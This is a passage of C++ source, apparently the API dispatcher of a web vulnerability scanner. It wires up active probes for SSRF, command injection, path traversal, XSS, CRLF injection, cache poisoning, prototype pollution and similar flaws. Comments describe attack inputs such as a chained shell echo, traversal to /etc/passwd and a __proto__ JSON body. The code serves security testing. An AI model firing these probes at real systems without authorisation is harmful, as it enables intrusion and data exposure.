        for (auto it = shdrs.begin(); it != shdrs.end(); ++it)
            sr.headers.append({ it.key(), it.value().toString() });

        const auto sres = Nullock::Core::SsrfScan::test(sr);

        QJsonArray hits;
        for (const auto &h : sres.hits)
            hits.append(QJsonObject{
                { "param", h.param }, { "technique", h.technique },
                { "payload", h.payload }, { "signal", h.signal },
                { "severity", h.severity }, { "kind", h.kind } });
        if (m_wiring.scanner && sres.vulnerable) {
            const auto &h0 = sres.hits.first();
            m_wiring.scanner->reportFinding(0, h0.severity, h0.kind,
                QString("SSRF in '%1' (%2) -- the server fetched an attacker-controlled URL")
                    .arg(h0.param, h0.technique),
                QString("payload=%1 · response contained the fetch-only signature \"%2\", "
                        "absent from the baseline").arg(h0.payload, h0.signal),
                u.host(), url);
        }
        return okJson({{ "ok", sres.error.isEmpty() },
                       { "error", sres.error },
                       { "vulnerable", sres.vulnerable },
                       { "testedParam", sres.testedParam },
                       { "baselineStatus", sres.baselineStatus },
                       { "requestsSent", sres.requestsSent },
                       { "hitCount", static_cast<int>(sres.hits.size()) },
                       { "hits", hits }});
    }

    // ---- Insecure deserialization (active, error-based) --------------
    // POST /api/deser/test { url, param?, method?, headers? }
    //   Injects malformed serialized stubs; confirms by a deserialization
    //   error absent from the baseline and not reproduced by a benign
    //   value. CWE-502.
    if (path == "/api/deser/test") {
        const QString url = bodyJson.value("url").toString();
        const QUrl u(url);
        if (url.isEmpty() || !u.isValid() || u.host().isEmpty())
            return okJson({{ "ok", false }, { "error", "valid url required" }});

        Nullock::Core::DeserProbe::Request dr;
        dr.host = u.host();
        dr.port = u.port(u.scheme() == "https" ? 443 : 80);
        dr.tls  = (u.scheme() == "https");
        dr.method = httpMethodFromJson(bodyJson, "GET");
        dr.basePath = u.path(QUrl::FullyEncoded).isEmpty()
                      ? QStringLiteral("/") : u.path(QUrl::FullyEncoded);
        dr.query = u.query(QUrl::FullyEncoded);
        dr.param = bodyJson.value("param").toString();
        dr.location = bodyJson.value("location").toString();        // ""/"query" | "body"
        dr.contentType = contentTypeFromJson(bodyJson);
        const QJsonObject dhdrs = bodyJson.value("headers").toObject();
        for (auto it = dhdrs.begin(); it != dhdrs.end(); ++it)
            dr.headers.append({ it.key(), it.value().toString() });

        const auto dres = Nullock::Core::DeserProbe::test(dr);

        QJsonArray hits;
        for (const auto &h : dres.hits)
            hits.append(QJsonObject{
                { "param", h.param }, { "format", h.format },
                { "payload", h.payload }, { "evidence", h.evidence } });
        if (m_wiring.scanner && dres.vulnerable) {
            const auto &h0 = dres.hits.first();
            m_wiring.scanner->reportFinding(0, "critical",
                Nullock::Core::DeserProbe::kindForFormat(h0.format),
                QString("Insecure deserialization in '%1' (%2) -- the endpoint deserializes attacker input")
                    .arg(h0.param, h0.format),
                "a malformed serialized stub triggered a deserialization parse error, "
                "absent from the baseline and not reproduced by a benign value: " + h0.evidence,
                u.host(), url);
        }
        return okJson({{ "ok", dres.error.isEmpty() },
                       { "error", dres.error },
                       { "vulnerable", dres.vulnerable },
                       { "baselineStatus", dres.baselineStatus },
                       { "requestsSent", dres.requestsSent },
                       { "testedParams", QJsonArray::fromStringList(dres.testedParams) },
                       { "droppedParams", QJsonArray::fromStringList(dres.droppedParams) },
                       { "hitCount", static_cast<int>(dres.hits.size()) },
                       { "hits", hits }});
    }

    // ---- Cross-Site WebSocket Hijacking (active) ---------------------
    // POST /api/cswsh/test { url, origin?, headers? }
    //   Sends a cross-origin WS upgrade; confirms CSWSH on 101 + a valid
    //   Sec-WebSocket-Accept. CWE-1385.
    if (path == "/api/cswsh/test") {
        const QString url = bodyJson.value("url").toString();
        const QUrl u(url);
        if (url.isEmpty() || !u.isValid() || u.host().isEmpty())
            return okJson({{ "ok", false }, { "error", "valid url required" }});

        Nullock::Core::WsProbe::Request wr;
        wr.host = u.host();
        const QString scheme = u.scheme().toLower();
        wr.tls  = (scheme == "wss" || scheme == "https");
        wr.port = u.port(wr.tls ? 443 : 80);
        wr.basePath = u.path(QUrl::FullyEncoded).isEmpty()
                      ? QStringLiteral("/") : u.path(QUrl::FullyEncoded);
        if (!u.query(QUrl::FullyEncoded).isEmpty())
            wr.basePath += "?" + u.query(QUrl::FullyEncoded);
        wr.attackerOrigin = bodyJson.value("origin").toString();
        const QJsonObject whdrs = bodyJson.value("headers").toObject();
        for (auto it = whdrs.begin(); it != whdrs.end(); ++it)
            wr.headers.append({ it.key(), it.value().toString() });

        const auto wres = Nullock::Core::WsProbe::test(wr);
        if (m_wiring.scanner && wres.crossOriginAccepted)
            m_wiring.scanner->reportFinding(0, "high", "ws-cross-origin-accepted",
                "Cross-site WebSocket hijacking: cross-origin upgrade accepted while carrying a session credential",
                wres.detail, u.host(), url);
        else if (m_wiring.scanner && wres.originNotValidated)
            // Origin not validated, but no credential was supplied -- a lead, not
            // a confirmed hijack (a public/unauthenticated WS accepting any
            // Origin is expected). Graded info; re-test with a session Cookie.
            m_wiring.scanner->reportFinding(0, "info", "ws-origin-not-validated",
                "WebSocket Origin not validated (no credential supplied -- confirm the socket is cookie-gated)",
                wres.detail, u.host(), url);
        return okJson({{ "ok", wres.error.isEmpty() },
                       { "error", wres.error },
                       { "vulnerable", wres.crossOriginAccepted },
                       { "originNotValidated", wres.originNotValidated },
                       { "isWebSocket", wres.isWebSocket },
                       { "originValidated", wres.originValidated },
                       { "attackerStatus", wres.attackerStatus },
                       { "controlStatus", wres.controlStatus },
                       { "attackerOrigin", wres.attackerOrigin },
                       { "detail", wres.detail }});
    }

    // ---- Reflected XSS -----------------------------------------------
    // POST /api/xss/test { url, param?, method?, headers? }
    //   Injects context-breakout marker tags; confirms when the angle
    //   brackets reflect unencoded. CWE-79.
    if (path == "/api/xss/test") {
        const QString url = bodyJson.value("url").toString();
        const QUrl u(url);
        if (url.isEmpty() || !u.isValid() || u.host().isEmpty())
            return okJson({{ "ok", false }, { "error", "valid url required" }});

        Nullock::Core::XssReflected::Request xr;
        xr.host = u.host();
        xr.port = u.port(u.scheme() == "https" ? 443 : 80);
        xr.tls  = (u.scheme() == "https");
        xr.method = httpMethodFromJson(bodyJson, "GET");
        xr.basePath = u.path(QUrl::FullyEncoded).isEmpty()
                      ? QStringLiteral("/") : u.path(QUrl::FullyEncoded);
        xr.query = u.query(QUrl::FullyEncoded);
        xr.param = bodyJson.value("param").toString();
        const QJsonObject xhdrs = bodyJson.value("headers").toObject();
        for (auto it = xhdrs.begin(); it != xhdrs.end(); ++it)
            xr.headers.append({ it.key(), it.value().toString() });

        const auto xres = Nullock::Core::XssReflected::test(xr);

        QJsonArray hits;
        QStringList where;
        for (const auto &h : xres.hits) {
            hits.append(QJsonObject{
                { "param", h.param }, { "context", h.context },
                { "payload", h.payload }, { "evidence", h.evidence } });
            where << h.param + "/" + h.context;
        }
        if (m_wiring.scanner && xres.vulnerable)
            m_wiring.scanner->reportFinding(0, "high", "reflected-xss",
                QString("Reflected XSS in '%1' (%2 context) -- markup reflects unencoded")
                    .arg(xres.hits.first().param, xres.hits.first().context),
                "an injected tag was reflected with raw angle brackets: " + xres.hits.first().evidence,
                u.host(), url);
        return okJson({{ "ok", xres.error.isEmpty() },
                       { "error", xres.error },
                       { "vulnerable", xres.vulnerable },
                       { "baselineStatus", xres.baselineStatus },
                       { "requestsSent", xres.requestsSent },
                       { "testedParams", QJsonArray::fromStringList(xres.testedParams) },
                       { "hitCount", static_cast<int>(xres.hits.size()) },
                       { "hits", hits }});
    }

    // ---- OS command injection ----------------------------------------
    // POST /api/cmdi/test { url, param?, method?, headers? }
    //   Chains `echo <sentinel>$((a*b))<sentinel>` onto the param; confirms by
    //   the evaluated arithmetic in the response (real shell exec). CWE-78.
    if (path == "/api/cmdi/test") {
        const QString url = bodyJson.value("url").toString();
        const QUrl u(url);
        if (url.isEmpty() || !u.isValid() || u.host().isEmpty())
            return okJson({{ "ok", false }, { "error", "valid url required" }});

        Nullock::Core::CmdInjection::Request cir;
        cir.host = u.host();
        cir.port = u.port(u.scheme() == "https" ? 443 : 80);
        cir.tls  = (u.scheme() == "https");
        cir.method = httpMethodFromJson(bodyJson, "GET");
        cir.basePath = u.path(QUrl::FullyEncoded).isEmpty()
                       ? QStringLiteral("/") : u.path(QUrl::FullyEncoded);
        cir.query = u.query(QUrl::FullyEncoded);
        cir.param = bodyJson.value("param").toString();
        const QJsonObject chdrs = bodyJson.value("headers").toObject();
        for (auto it = chdrs.begin(); it != chdrs.end(); ++it)
            cir.headers.append({ it.key(), it.value().toString() });

        const auto cres = Nullock::Core::CmdInjection::test(cir);

        QJsonArray hits;
        QStringList where;
        for (const auto &h : cres.hits) {
            hits.append(QJsonObject{
                { "param", h.param }, { "technique", h.technique },
                { "payload", h.payload }, { "evidence", h.evidence } });
            where << h.param + "/" + h.technique;
        }
        if (m_wiring.scanner && cres.vulnerable)
            m_wiring.scanner->reportFinding(0, "critical", "command-injection",
                QString("OS command injection in '%1' via %2 -- arbitrary commands execute")
                    .arg(cres.hits.first().param, cres.hits.first().technique),
                "the server executed an injected shell command (command substitution): "
                    + cres.hits.first().evidence,
                u.host(), url);
        return okJson({{ "ok", cres.error.isEmpty() },
                       { "error", cres.error },
                       { "vulnerable", cres.vulnerable },
                       { "baselineStatus", cres.baselineStatus },
                       { "requestsSent", cres.requestsSent },
                       { "testedParams", QJsonArray::fromStringList(cres.testedParams) },
                       { "droppedParams", QJsonArray::fromStringList(cres.droppedParams) },
                       { "hitCount", static_cast<int>(cres.hits.size()) },
                       { "hits", hits }});
    }

    // ---- Path traversal / LFI ----------------------------------------
    // POST /api/pathtraversal/test { url, param?, method?, headers? }
    //   Injects traversal encodings aimed at /etc/passwd & win.ini; confirms
    //   by the file's content signature in the response. CWE-22.
    if (path == "/api/pathtraversal/test") {
        const QString url = bodyJson.value("url").toString();
        const QUrl u(url);
        if (url.isEmpty() || !u.isValid() || u.host().isEmpty())
            return okJson({{ "ok", false }, { "error", "valid url required" }});

        Nullock::Core::PathTraversal::Request pr;
        pr.host = u.host();
        pr.port = u.port(u.scheme() == "https" ? 443 : 80);
        pr.tls  = (u.scheme() == "https");
        pr.method = httpMethodFromJson(bodyJson, "GET");
        pr.basePath = u.path(QUrl::FullyEncoded).isEmpty()
                      ? QStringLiteral("/") : u.path(QUrl::FullyEncoded);
        pr.query = u.query(QUrl::FullyEncoded);
        pr.param = bodyJson.value("param").toString();
        const QJsonObject phdrs = bodyJson.value("headers").toObject();
        for (auto it = phdrs.begin(); it != phdrs.end(); ++it)
            pr.headers.append({ it.key(), it.value().toString() });

        const auto pres = Nullock::Core::PathTraversal::test(pr);

        QJsonArray hits;
        QStringList where;
        for (const auto &h : pres.hits) {
            hits.append(QJsonObject{
                { "param", h.param }, { "technique", h.technique },
                { "target", h.target }, { "payload", h.payload },
                { "evidence", h.evidence } });
            where << h.param + " -> " + h.target;
        }
        if (m_wiring.scanner && pres.vulnerable)
            m_wiring.scanner->reportFinding(0, "critical", "path-traversal",
                QString("Path traversal: %1 read via %2 (%3)")
                    .arg(pres.hits.first().target, pres.hits.first().param, pres.hits.first().technique),
                "a traversal payload returned the target file's content: " + pres.hits.first().evidence,
                u.host(), url);
        return okJson({{ "ok", pres.error.isEmpty() },
                       { "error", pres.error },
                       { "vulnerable", pres.vulnerable },
                       { "baselineStatus", pres.baselineStatus },
                       { "requestsSent", pres.requestsSent },
                       { "testedParams", QJsonArray::fromStringList(pres.testedParams) },
                       { "droppedParams", QJsonArray::fromStringList(pres.droppedParams) },
                       { "hitCount", static_cast<int>(pres.hits.size()) },
                       { "hits", hits }});
    }

    // ---- CRLF / HTTP response splitting ------------------------------
    // POST /api/crlf/test { url, param?, method?, headers?, in?, body? }
    //   Injects encoded-CRLF payloads carrying a marker header; confirms by
    //   that header appearing in the parsed response. CWE-113. `in` selects the
    //   reflecting sink: "query" (default) | "body" (POST x-www-form-urlencoded)
    //   | "path" | "header" (a reflected request header) | "all". For "header",
    //   `param` is the header name to fuzz; for "body", `body` is the existing
    //   form body to preserve.
    if (path == "/api/crlf/test") {
        const QString url = bodyJson.value("url").toString();
        const QUrl u(url);
        if (url.isEmpty() || !u.isValid() || u.host().isEmpty())
            return okJson({{ "ok", false }, { "error", "valid url required" }});

        Nullock::Core::CrlfInjection::Request cr;
        cr.host = u.host();
        cr.port = u.port(u.scheme() == "https" ? 443 : 80);
        cr.tls  = (u.scheme() == "https");
        cr.method = httpMethodFromJson(bodyJson, "GET");
        cr.basePath = u.path(QUrl::FullyEncoded).isEmpty()
                      ? QStringLiteral("/") : u.path(QUrl::FullyEncoded);
        cr.query = u.query(QUrl::FullyEncoded);
        cr.body = bodyJson.value("body").toString().toUtf8();
        cr.param = bodyJson.value("param").toString();
        cr.in = bodyJson.value("in").toString();
        const QJsonObject chdrs = bodyJson.value("headers").toObject();
        for (auto it = chdrs.begin(); it != chdrs.end(); ++it)
            cr.headers.append({ it.key(), it.value().toString() });

        const auto cres = Nullock::Core::CrlfInjection::test(cr);

        QJsonArray hits;
        QStringList where;
        for (const auto &h : cres.hits) {
            hits.append(QJsonObject{
                { "point", h.point }, { "param", h.param }, { "technique", h.technique },
                { "payload", h.payload }, { "evidence", h.evidence } });
            where << h.point + "/" + h.param + "/" + h.technique;
        }
        if (m_wiring.scanner && cres.vulnerable)
            m_wiring.scanner->reportFinding(0, "high", "crlf-injection",
                QString("HTTP response splitting via %1 -- an injected header landed in the response (%2)")
                    .arg(cres.hits.first().param, where.join(", ")),
                "user input reaches a response header without CR/LF stripping",
                u.host(), url);
        return okJson({{ "ok", cres.error.isEmpty() },
                       { "error", cres.error },
                       { "vulnerable", cres.vulnerable },
                       { "baselineStatus", cres.baselineStatus },
                       { "requestsSent", cres.requestsSent },
                       { "testedParams", QJsonArray::fromStringList(cres.testedParams) },
                       { "hitCount", static_cast<int>(cres.hits.size()) },
                       { "hits", hits }});
    }

    // ---- Secret scanning (page + same-origin JS) ---------------------
    // POST /api/secrets/scan { url, headers?, followScripts? }
    //   Fetches the URL and its same-origin scripts and flags exposed
    //   provider keys / tokens / private keys, masked. CWE-798.
    if (path == "/api/secrets/scan") {
        const QString url = bodyJson.value("url").toString();
        const QUrl u(url);
        if (url.isEmpty() || !u.isValid() || u.host().isEmpty())
            return okJson({{ "ok", false }, { "error", "valid url required" }});

        Nullock::Core::SecretScanner::Request sr;
        sr.host = u.host();
        sr.port = u.port(u.scheme() == "https" ? 443 : 80);
        sr.tls  = (u.scheme() == "https");
        sr.basePath = u.path(QUrl::FullyEncoded).isEmpty()
                      ? QStringLiteral("/") : u.path(QUrl::FullyEncoded);
        sr.query = u.query(QUrl::FullyEncoded);
        sr.followScripts = bodyJson.value("followScripts").toBool(true);
        const QJsonObject shdrs = bodyJson.value("headers").toObject();
        for (auto it = shdrs.begin(); it != shdrs.end(); ++it)
            sr.headers.append({ it.key(), it.value().toString() });

        const auto sres = Nullock::Core::SecretScanner::scan(sr);

        QJsonArray hits;
        for (const auto &h : sres.hits) {
            hits.append(QJsonObject{
                { "type", h.type }, { "severity", h.severity },
                { "location", h.location }, { "masked", h.masked },
                { "context", h.context } });
            if (m_wiring.scanner)
                m_wiring.scanner->reportFinding(0, h.severity, "secret-exposed",
                    QString("Exposed %1 in client code: %2").arg(h.type, h.masked),
                    "found at " + h.location + " -- context: " + h.context,
                    u.host(), h.location);
        }
        return okJson({{ "ok", sres.error.isEmpty() },
                       { "error", sres.error },
                       { "resourcesScanned", sres.resourcesScanned },
                       { "requestsSent", sres.requestsSent },
                       { "hitCount", static_cast<int>(sres.hits.size()) },
                       { "hits", hits }});
    }

    // ---- Security-header / CSP audit ---------------------------------
    // POST /api/headers/audit { url, headers? }
    //   Fetches the URL once and audits response security headers, with a
    //   CSP analyzer that flags unsafe-inline/eval, wildcard sources, missing
    //   object-src/base-uri, and bypassable script-gadget hosts.
    if (path == "/api/headers/audit") {
        const QString url = bodyJson.value("url").toString();
        const QUrl u(url);
        if (url.isEmpty() || !u.isValid() || u.host().isEmpty())
            return okJson({{ "ok", false }, { "error", "valid url required" }});

        Nullock::Core::HeaderAudit::Request hr;
        hr.host = u.host();
        hr.port = u.port(u.scheme() == "https" ? 443 : 80);
        hr.tls  = (u.scheme() == "https");
        hr.basePath = u.path(QUrl::FullyEncoded).isEmpty()
                      ? QStringLiteral("/") : u.path(QUrl::FullyEncoded);
        hr.query = u.query(QUrl::FullyEncoded);
        const QJsonObject hhdrs = bodyJson.value("headers").toObject();
        for (auto it = hhdrs.begin(); it != hhdrs.end(); ++it)
            hr.headers.append({ it.key(), it.value().toString() });

        const auto hres = Nullock::Core::HeaderAudit::test(hr);

        QJsonArray findings;
        for (const auto &f : hres.findings) {
            findings.append(QJsonObject{
                { "key", f.key }, { "severity", f.severity },
                { "title", f.title }, { "detail", f.detail } });
            if (m_wiring.scanner)
                m_wiring.scanner->reportFinding(0, f.severity, f.key, f.title,
                                                f.detail, u.host(), url);
        }
        return okJson({{ "ok", hres.error.isEmpty() },
                       { "error", hres.error },
                       { "status", hres.status },
                       { "hasCsp", hres.hasCsp },
                       { "reportOnlyOnly", hres.reportOnlyOnly },
                       { "findingCount", static_cast<int>(hres.findings.size()) },
                       { "findings", findings }});
    }

    // ---- Open redirect -----------------------------------------------
    // POST /api/openredirect/test { url, param?, method?, headers? }
    //   Fires parser-confusion bypass payloads at the redirect param and
    //   confirms only when the Location header *resolves* to our sentinel
    //   host -- not on naive reflection. CWE-601.
    if (path == "/api/openredirect/test") {
        const QString url = bodyJson.value("url").toString();
        const QUrl u(url);
        if (url.isEmpty() || !u.isValid() || u.host().isEmpty())
            return okJson({{ "ok", false }, { "error", "valid url required" }});

        Nullock::Core::OpenRedirect::Request orq;
        orq.host = u.host();
        orq.port = u.port(u.scheme() == "https" ? 443 : 80);
        orq.tls  = (u.scheme() == "https");
        orq.method = httpMethodFromJson(bodyJson, "GET");
        orq.basePath = u.path(QUrl::FullyEncoded).isEmpty()
                       ? QStringLiteral("/") : u.path(QUrl::FullyEncoded);
        orq.query = u.query(QUrl::FullyEncoded);
        orq.param = bodyJson.value("param").toString();
        const QJsonObject ohdrs = bodyJson.value("headers").toObject();
        for (auto it = ohdrs.begin(); it != ohdrs.end(); ++it)
            orq.headers.append({ it.key(), it.value().toString() });

        const auto ores = Nullock::Core::OpenRedirect::test(orq);

        QJsonArray hits;
        QStringList techniques;
        for (const auto &h : ores.hits) {
            hits.append(QJsonObject{
                { "technique", h.technique }, { "payload", h.payload },
                { "via", h.via }, { "resolvedHost", h.resolvedHost },
                { "param", h.param }, { "status", h.status } });
            techniques << h.technique;
        }
        if (m_wiring.scanner && ores.vulnerable) {
            // Server-confirmed (Location / Refresh header) is high; client-side
            // (meta/JS body) only is medium.
            bool headerConfirmed = false;
            for (const auto &h : ores.hits)
                if (h.via == "Location" || h.via == "refresh-header") headerConfirmed = true;
            m_wiring.scanner->reportFinding(0, headerConfirmed ? "high" : "medium",
                "open-redirect",
                QString("Open redirect in '%1' -- %2 redirect(s) leave the origin (%3)")
                    .arg(ores.testedParam).arg(ores.hits.size()).arg(techniques.join(", ")),
                "a crafted value redirects victims off-origin; an OAuth/SSO redirect_uri "
                "in this position is a token-leak primitive",
                u.host(), url);
        }
        return okJson({{ "ok", ores.error.isEmpty() },
                       { "error", ores.error },
                       { "testedParam", ores.testedParam },
                       { "testedParams", QJsonArray::fromStringList(ores.testedParams) },
                       { "vulnerable", ores.vulnerable },
                       { "baselineStatus", ores.baselineStatus },
                       { "requestsSent", ores.requestsSent },
                       { "hitCount", static_cast<int>(ores.hits.size()) },
                       { "hits", hits }});
    }

    // ---- Web cache poisoning -----------------------------------------
    // POST /api/cache/poison { url, method?, headers? }
    //   Injects unkeyed headers (X-Forwarded-Host, X-Original-URL, ...) with
    //   a random sentinel and a per-probe cache-buster, then re-requests the
    //   same key with no header; a sentinel served from cache proves the
    //   poisoning end to end. CWE-349. Fail-closed: injects only after it
    //   positively proves the cache keys on the buster (a same-buster hit and a
    //   different-buster miss); a silent or unconfirmable cache aborts without
    //   injecting, so it can't poison the key real users are served.
    if (path == "/api/cache/poison") {
        const QString url = bodyJson.value("url").toString();
        const QUrl u(url);
        if (url.isEmpty() || !u.isValid() || u.host().isEmpty())
            return okJson({{ "ok", false }, { "error", "valid url required" }});

        Nullock::Core::CachePoison::Request cr;
        cr.host = u.host();
        cr.port = u.port(u.scheme() == "https" ? 443 : 80);
        cr.tls  = (u.scheme() == "https");
        cr.method = httpMethodFromJson(bodyJson, "GET");
        cr.basePath = u.path(QUrl::FullyEncoded).isEmpty()
                      ? QStringLiteral("/") : u.path(QUrl::FullyEncoded);
        cr.query = u.query(QUrl::FullyEncoded);
        const QJsonObject chdrs = bodyJson.value("headers").toObject();
        for (auto it = chdrs.begin(); it != chdrs.end(); ++it)
            cr.headers.append({ it.key(), it.value().toString() });

        const auto cres = Nullock::Core::CachePoison::test(cr);

        QJsonArray hits;
        for (const auto &h : cres.hits) {
            hits.append(QJsonObject{
                { "header", h.header }, { "sentValue", h.sentValue },
                { "where", h.where }, { "reflected", h.reflected },
                { "cacheable", h.cacheable }, { "cacheConfirmed", h.cacheConfirmed } });
            if (m_wiring.scanner) {
                if (h.cacheConfirmed)
                    m_wiring.scanner->reportFinding(0, "critical", "web-cache-poisoning-confirmed",
                        QString("Web cache poisoning via %1 on %2 -- a clean request was served the injected value from cache")
                            .arg(h.header, cr.basePath),
                        "an unkeyed header reflected into a cacheable response and survived a header-less re-request",
                        u.host(), url);
                else if (h.cacheable)
                    m_wiring.scanner->reportFinding(0, "high", "web-cache-poisoning",
                        QString("Unkeyed header %1 reflects into a cacheable response (%2)")
                            .arg(h.header, h.where),
                        "reflected into a response carrying cache signals; likely poisonable",
                        u.host(), url);
                else
                    m_wiring.scanner->reportFinding(0, "low", "web-cache-unkeyed-reflected",
                        QString("Unkeyed header %1 reflects into the response (%2)")
                            .arg(h.header, h.where),
                        "no cache evidence observed; confirm whether a fronting cache stores it",
                        u.host(), url);
            }
        }
        return okJson({{ "ok", cres.error.isEmpty() },
                       { "error", cres.error },
                       { "baselineStatus", cres.baselineStatus },
                       { "requestsSent", cres.requestsSent },
                       { "anyConfirmed", cres.anyConfirmed },
                       { "anyCacheable", cres.anyCacheable },
                       { "hitCount", static_cast<int>(cres.hits.size()) },
                       { "hits", hits }});
    }

    // ---- Server-side prototype pollution -----------------------------
    // POST /api/protopollution/test { url, polluteUrl?, headers? }
    //   Confirms server-side prototype pollution via the benign json-spaces
    //   gadget: baseline-compact -> POST {"__proto__":{"json spaces":7}} ->
    //   the JSON endpoint indents by exactly 7 -> cleanup reverts to compact.
    //   Mutates only response formatting; scope-gated. CWE-1321.
    //   `url` is the JSON observation endpoint AND the scope-gated target.
    //   `polluteUrl` is optional: only its PATH is used (the merge route),
    //   always on `url`'s host/port/scheme; its query string is ignored.
    //   ok=false (with a WARNING error) if pollution succeeded but the probe
    //   could not confirm the target was reverted.
    if (path == "/api/protopollution/test") {
        const QString url = bodyJson.value("url").toString();
        const QUrl u(url);
        if (url.isEmpty() || !u.isValid() || u.host().isEmpty())
            return okJson({{ "ok", false }, { "error", "valid url required" }});

        Nullock::Core::ProtoPollution::Request pr;
        pr.host = u.host();
        pr.port = u.port(u.scheme() == "https" ? 443 : 80);
        pr.tls  = (u.scheme() == "https");
        pr.jsonPath = u.path(QUrl::FullyEncoded).isEmpty()
                      ? QStringLiteral("/") : u.path(QUrl::FullyEncoded);
        pr.jsonQuery = u.query(QUrl::FullyEncoded);
        // Optional separate merge endpoint. We take ONLY its path: the request
        // is always sent to url's host/port/scheme (which is what scope gates
        // on), so polluteUrl can't redirect the probe off-target; its host and
        // query are intentionally ignored.
        const QString polluteUrl = bodyJson.value("polluteUrl").toString();
        if (!polluteUrl.isEmpty()) {
            const QUrl pu(polluteUrl);
            pr.pollutePath = pu.path(QUrl::FullyEncoded).isEmpty()
                             ? QStringLiteral("/") : pu.path(QUrl::FullyEncoded);
        }
        const QJsonObject phdrs = bodyJson.value("headers").toObject();
        for (auto it = phdrs.begin(); it != phdrs.end(); ++it)
            pr.headers.append({ it.key(), it.value().toString() });

        const auto pres = Nullock::Core::ProtoPollution::test(pr);
        if (pres.vulnerable && m_wiring.scanner)
            m_wiring.scanner->reportFinding(0, "high", "proto-pollution-reflected",
                QString("Server-side prototype pollution on %1 -- %2")
                    .arg(pr.jsonPath, pres.evidence),
                QString("gadget: Object.prototype[%1]; %2 requests").arg(pres.gadget).arg(pres.requestsSent),
                u.host(), url);
        return okJson({{ "ok", pres.error.isEmpty() },
                       { "error", pres.error },
                       { "vulnerable", pres.vulnerable },
                       { "gadget", pres.gadget },
                       { "evidence", pres.evidence },
                       { "observedJson", pres.observedJson },
                       { "baselineCompact", pres.baselineCompact },
                       { "indentedAfterPollute", pres.indentedAfterPollute },
                       { "revertedAfterCleanup", pres.revertedAfterCleanup },
                       { "polluteKey", pres.polluteKey },
                       { "baselineStatus", pres.baselineStatus },
                       { "requestsSent", pres.requestsSent }});
    }

    // ---- HTTP/3 (QUIC) readiness detection ---------------------------
    // POST /api/http3/detect { url, headers? }
    //   One GET, then parse Alt-Svc (RFC 7838) for advertised h3* versions.
    //   Read-only discovery -- it does not speak QUIC. Emits an info finding
    //   when HTTP/3 is advertised (a distinct attack surface). Scope-gated.
    if (path == "/api/http3/detect") {
        const QString url = bodyJson.value("url").toString();
        const QUrl u(url);
        if (url.isEmpty() || !u.isValid() || u.host().isEmpty())
            return okJson({{ "ok", false }, { "error", "valid url required" }});

        Nullock::Core::Http3Detect::Request hr;
        hr.host = u.host();
        hr.port = u.port(u.scheme() == "https" ? 443 : 80);
        hr.tls  = (u.scheme() == "https");
        hr.path = u.path(QUrl::FullyEncoded).isEmpty()
                  ? QStringLiteral("/") : u.path(QUrl::FullyEncoded);
        hr.query = u.query(QUrl::FullyEncoded);
        const QJsonObject hhdrs = bodyJson.value("headers").toObject();
        for (auto it = hhdrs.begin(); it != hhdrs.end(); ++it)
            hr.headers.append({ it.key(), it.value().toString() });

        const auto hres = Nullock::Core::Http3Detect::detect(hr);

        QJsonArray protos;
        for (const auto &p : hres.protocols)
            protos.append(QJsonObject{
                { "id", p.id }, { "authority", p.authority },
                { "maxAge", p.maxAge }, { "isHttp3", p.isHttp3 } });
        if (hres.advertisesHttp3 && m_wiring.scanner)
            m_wiring.scanner->reportFinding(0, "info", "http3-advertised",
                QString("HTTP/3 advertised (%1)").arg(hres.http3Versions.join(", ")),
                "via Alt-Svc: " + hres.altSvcRaw, hr.host, url);
        return okJson({{ "ok", hres.error.isEmpty() },
                       { "error", hres.error },
                       { "advertisesHttp3", hres.advertisesHttp3 },
                       { "http3Versions", QJsonArray::fromStringList(hres.http3Versions) },
                       { "altSvc", hres.altSvcRaw },
                       { "protocols", protos },
                       { "baselineStatus", hres.baselineStatus }});
    }

    // ---- Host-header injection ---------------------------------------
    // POST /api/hostheader/test { url, method?, headers? }
    //   Injects a unique sentinel host via Host / X-Forwarded-Host / ... and
    //   reports it reflecting into a URL context (Location or //sentinel in the
    //   body) -- the password-reset/redirect-poisoning class. CWE-20. Scope-gated.
    if (path == "/api/hostheader/test") {
        const QString url = bodyJson.value("url").toString();
        const QUrl u(url);
        if (url.isEmpty() || !u.isValid() || u.host().isEmpty())
            return okJson({{ "ok", false }, { "error", "valid url required" }});

        Nullock::Core::HostHeader::Request hr;
        hr.host = u.host();
        hr.port = u.port(u.scheme() == "https" ? 443 : 80);
        hr.tls  = (u.scheme() == "https");
        hr.method = httpMethodFromJson(bodyJson, "GET");
        hr.basePath = u.path(QUrl::FullyEncoded).isEmpty()
                      ? QStringLiteral("/") : u.path(QUrl::FullyEncoded);
        hr.query = u.query(QUrl::FullyEncoded);
        const QJsonObject hhdrs = bodyJson.value("headers").toObject();
        for (auto it = hhdrs.begin(); it != hhdrs.end(); ++it)
            hr.headers.append({ it.key(), it.value().toString() });

        const auto hres = Nullock::Core::HostHeader::test(hr);

        QJsonArray hits;
        for (const auto &h : hres.hits) {
            hits.append(QJsonObject{
                { "header", h.header }, { "sentinel", h.sentinel },
                { "where", h.where }, { "fromHostLine", h.fromHostLine },
                { "inLocation", h.inLocation },
                { "inUrlContext", h.inUrlContext }, { "reflected", h.reflected } });
            if (!m_wiring.scanner) continue;
            // High ONLY for the literal Host line driving a Location redirect --
            // the victim's browser sends Host, so this is the genuine reset/
            // redirect poisoning vector. A forwarding-header URL hit, or any
            // body-url echo, is "needs confirmation" (medium): a fronting proxy
            // may just be echoing the forwarding header.
            if (h.fromHostLine && h.where == "Location")
                m_wiring.scanner->reportFinding(0, "high", "host-header-injection",
                    QString("Host-header injection via %1 -- Host line reflected into the redirect %2")
                        .arg(h.header, h.where),
                    QString("injected sentinel %1 became the Location host; password-reset/redirect poisoning vector")
                        .arg(h.sentinel),
                    hr.host, url);
            else if (h.inUrlContext)
                m_wiring.scanner->reportFinding(0, "medium", "host-header-reflected-location",
                    QString("Host-header value via %1 reflected into a URL context (%2) -- needs confirmation")
                        .arg(h.header, h.where),
                    QString("injected sentinel %1 reached a URL context; confirm the app (not a fronting proxy) "
                            "builds this URL and that it reaches a victim-deliverable sink").arg(h.sentinel),
                    hr.host, url);
            else if (h.reflected)
                m_wiring.scanner->reportFinding(0, "info", "host-header-reflected",
                    QString("Host-header value via %1 reflected in the body").arg(h.header),
                    QString("injected sentinel %1 echoed (not in a URL context)").arg(h.sentinel),
                    hr.host, url);
        }
        return okJson({{ "ok", hres.error.isEmpty() },
                       { "error", hres.error },
                       { "anyInjection", hres.anyInjection },
                       { "anyReflected", hres.anyReflected },
                       { "hitCount", static_cast<int>(hres.hits.size()) },
                       { "baselineStatus", hres.baselineStatus },
                       { "requestsSent", hres.requestsSent },
                       { "hits", hits }});
    }

